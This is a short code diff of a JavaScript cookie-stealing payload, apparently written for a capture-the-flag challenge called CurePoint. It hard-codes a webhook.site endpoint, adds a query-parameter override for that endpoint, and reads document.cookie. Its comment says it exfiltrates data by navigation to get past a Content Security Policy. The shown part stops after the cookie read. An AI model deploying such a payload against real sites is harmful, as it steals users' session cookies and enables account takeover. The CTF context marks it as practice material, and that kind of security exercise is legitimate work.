@@ -1,6 +1,10 @@
-/* CurePoint CTF — CSP blocks fetch; exfil via navigation (short query for proxy limits). */
+/* CurePoint CTF — CSP blocks fetch; exfil via navigation. Optional ?w=https://webhook.site/YOUR_ID */
 (function () {
   var WH = "https://webhook.site/af75be10-0cbe-4fc8-843e-2dc8c15d14ed";
+  try {
+    var w = new URLSearchParams(window.location.search).get("w");
+    if (w && /^https?:\/\//i.test(w)) WH = w;
+  } catch (e) {}
   var c = "";
   try {
     c = document.cookie;
